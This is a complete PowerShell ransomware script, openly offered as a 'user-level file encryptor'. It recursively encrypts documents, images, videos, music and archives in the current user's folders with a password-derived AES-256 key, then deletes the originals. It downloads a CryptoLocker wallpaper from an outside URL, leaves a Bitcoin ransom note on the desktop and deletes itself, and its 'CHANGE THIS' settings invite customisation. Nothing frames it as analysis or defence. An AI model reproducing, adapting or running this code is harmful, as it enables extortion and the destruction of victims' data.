<#
.SYNOPSIS
    User-level file encryptor with wallpaper change (no admin required)
.DESCRIPTION
    1. Encrypts documents, images, videos, music, and archives in user-accessible locations
    2. Changes wallpaper for current user
    3. Leaves ransom note on desktop
.NOTES
    Runs without admin rights but requires write access to target directories
#>

# --- Configuration ---
$Password = "Purr$3cureK1tty!"  # CHANGE THIS
$Salt = [byte[]]@(0x63, 0x61, 0x74, 0x6D, 0x65, 0x6F, 0x77, 0x21)  # CHANGE THIS
$Iterations = 100000
$WallpaperUrl = "https://blog-en.webroot.com/wp-content/uploads/2013/12/cryptolocker-desktop.bmp"
$RansomNote = @"
=== YOUR FILES HAVE BEEN ENCRYPTED ===

To decrypt your files, send 0.1 BTC to:
1KittyCoinAddressHereMEOW

Contact: meow@protonmail.com
"@

# File types to target (current user only)
$fileTypes = @(
    '.doc', '.docx', '.pdf', '.txt', '.xls', '.xlsx', '.ppt', '.pptx',
    '.jpg', '.jpeg', '.png', '.gif', '.bmp',
    '.mp4', '.avi', '.mov', '.mkv',
    '.mp3', '.wav', '.flac',
    '.zip', '.rar', '.7z'
)

# --- Encryption Functions ---
function New-EncryptionKey {
    param ([string]$Password, [byte[]]$Salt, [int]$Iterations)
    $keyGenerator = New-Object System.Security.Cryptography.Rfc2898DeriveBytes(
        $Password, $Salt, $Iterations, [System.Security.Cryptography.HashAlgorithmName]::SHA256
    )
    return @{
        Key = $keyGenerator.GetBytes(32)  # AES-256
        IV  = $keyGenerator.GetBytes(16)  # IV
    }
}

function Invoke-FileEncryption {
    param ([byte[]]$Key, [byte[]]$IV)
    
    $userDirs = @(
        [Environment]::GetFolderPath('MyDocuments'),
        [Environment]::GetFolderPath('Desktop'),
        [Environment]::GetFolderPath('Pictures'),
        [Environment]::GetFolderPath('Music'),
        [Environment]::GetFolderPath('Videos'),
        "$env:USERPROFILE\Downloads"
    )

    foreach ($dir in $userDirs) {
        if (Test-Path $dir) {
            Get-ChildItem -Path $dir -Recurse -File -Force | 
            Where-Object { $_.Extension -in $fileTypes -and $_.Name -notlike "*.meow" } |
            ForEach-Object {
                try {
                    $FileBytes = [System.IO.File]::ReadAllBytes($_.FullName)
                    $AES = [System.Security.Cryptography.Aes]::Create()
                    $AES.Key = $Key
                    $AES.IV = $IV
                    
                    $ms = [System.IO.MemoryStream]::new()
                    $cs = [System.Security.Cryptography.CryptoStream]::new(
                        $ms, $AES.CreateEncryptor(), [System.Security.Cryptography.CryptoStreamMode]::Write
                    )
                    $cs.Write($FileBytes, 0, $FileBytes.Length)
                    $cs.FlushFinalBlock()
                    
                    [System.IO.File]::WriteAllBytes("$($_.FullName).meow", $ms.ToArray())
                    Remove-Item -Path $_.FullName -Force
                }
                catch { continue }
                finally {
                    if ($cs) { $cs.Dispose() }
                    if ($ms) { $ms.Dispose() }
                    if ($AES) { $AES.Dispose() }
                }
            }
        }
    }
}

# --- Wallpaper Change ---
function Set-Wallpaper {
    $wallpaperPath = "$env:TEMP\wallpaper.bmp"
    try {
        (New-Object System.Net.WebClient).DownloadFile($WallpaperUrl, $wallpaperPath)
        Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class Wallpaper {
    [DllImport("user32.dll", CharSet = CharSet.Auto)]
    public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
}
"@
        [Wallpaper]::SystemParametersInfo(20, 0, $wallpaperPath, 3)
    }
    catch { }
}

# --- Ransom Note ---
function New-RansomNote {
    $notePath = [Environment]::GetFolderPath('Desktop') + "\READ_ME.txt"
    $RansomNote | Out-File -FilePath $notePath -Encoding ASCII
}

# --- Main Execution ---
$CryptoKey = New-EncryptionKey -Password $Password -Salt $Salt -Iterations $Iterations
Invoke-FileEncryption -Key $CryptoKey.Key -IV $CryptoKey.IV
Set-Wallpaper
New-RansomNote

# Self-delete (optional)
try {
    $scriptPath = $MyInvocation.MyCommand.Path
    Start-Sleep -Seconds 2
    Remove-Item -Path $scriptPath -Force
}
catch { }
